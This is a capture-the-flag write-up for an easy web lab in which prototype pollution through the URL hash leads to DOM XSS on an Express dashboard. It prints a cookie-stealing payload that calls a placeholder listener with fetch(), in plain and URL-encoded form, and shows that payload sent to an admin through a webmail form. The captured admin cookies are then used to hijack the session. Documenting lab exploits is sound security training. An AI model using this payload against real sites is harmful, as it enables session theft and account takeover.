# Pollution Writeup

**Difficulty:** Easy
**Target:** 10.1.251.33:3000
**Objective:** Gain administrator access to the web dashboard and retrieve the flag.

---

## Recon

### Port Scan

The scan used `nmap --min-rate 4500 --max-rtt-timeout 1500s -Pn -p- -sV 10.1.251.33`, which returned two open ports:

    22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    3000/tcp open  http  Node.js Express framework

Port 3000 is the web application. The aggressive scan rate is acceptable for a lab but should not be used on a live engagement.

### Web Enumeration

The root page on port 3000 is a login page. The credentials provided in the lab (`pentester` / `HackSmarter123`) log in and redirect to `/dashboard`. The dashboard exposes three areas:

- Log Search, a search box whose input is reflected back into the page
- Webmail, a form for contacting the admin, which asks users to "include links for investigation"
- Incident Response, which returns "Unauthorized" for a normal user

The Incident Response page is the likely target, since it is restricted to administrators.

### Technology Fingerprinting

The `X-Powered-By: Express` header and the Node.js banner confirm an Express application. The application's behavior, not its server version, drives the rest of the attack.

---

## Log Search Input Handling

Basic reflected XSS payloads in the Log Search box did not execute. Reviewing the page source showed that the results are written with `innerText`, which treats the input as plain text and prevents HTML from being parsed.

A second rendering block in the same script appends values directly into the results without filtering. That block only runs when a `renderCallback` option is set in the `options` object, so the page is vulnerable only if an attacker can control that property.

---

## Client-Side Prototype Pollution via URL Hash

The dashboard script reads parameters from `window.location.hash` and merges them into the `options` object. The merge does not block `__proto__` keys and the prototype is not frozen, so a value placed in the hash is written onto the shared prototype.

To confirm the pollution, the following URL triggers an alert:

    http://10.1.251.33:3000/dashboard#renderCallback=<img src=x onerror="alert(1)" />

The alert runs because the polluted `renderCallback` value is passed to the unfiltered rendering block, which inserts the `img` element as HTML. This is a DOM-based XSS.

---

## Cookie Theft via the Admin Visit

To confirm the payload can read cookies, the following URL was loaded in the logged-in session. The listener address is a placeholder for the attacker's machine:

    http://10.1.251.33:3000/dashboard#renderCallback=<img src=x onerror="fetch('http://<LISTENER>/c?' + document.cookie)" />

Once the payload worked locally, the same value was URL-encoded and sent to the admin through the Webmail form, with a short message asking them to review an incident:

    http://10.1.251.33:3000/dashboard#renderCallback=%3Cimg%20src=x%20onerror=%22fetch('http://<LISTENER>/c?'%20+%20document.cookie)%22%20/%3E

The admin's browser loads the link on its own schedule. A listener on the attacker side (for example `nc -lvnp 80`) received the admin's cookies in the request line:

    GET /c?session=HS_ADMIN_7721_SECURE_AUTH_TOKEN; user=admin HTTP/1.1

The admin visit happened repeatedly in the logs, so the exploit did not depend on a single visit.

---

## Session Hijack and Flag

The two cookies from the request were set in the browser's developer tools for `10.1.251.33:3000`, replacing the `pentester` cookie:

    session=HS_ADMIN_7721_SECURE_AUTH_TOKEN
    user=admin

Refreshing `/dashboard` showed the session as admin. The Incident Response page then returned the flag in the response body:

    GET /incident-response HTTP/1.1
    Cookie: session=HS_ADMIN_7721_SECURE_AUTH_TOKEN; user=admin

    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8

    <h1>Flag: HACKSMARTER{prowling_the_prot****</h1>

---

## Flags

**Flag: `HACKSMARTER{prowling_the_prot****`**